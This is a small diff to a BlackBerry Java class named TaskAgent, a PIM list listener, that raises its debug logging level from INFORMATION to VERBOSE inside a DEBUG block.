@@ -36,7 +36,7 @@ import blackberry.utils.Utils;
  */
 public final class TaskAgent extends Agent implements PIMListListener {
     //#ifdef DEBUG
-    static Debug debug = new Debug("TaskAgent", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
     //#endif
 
     Markup markup;
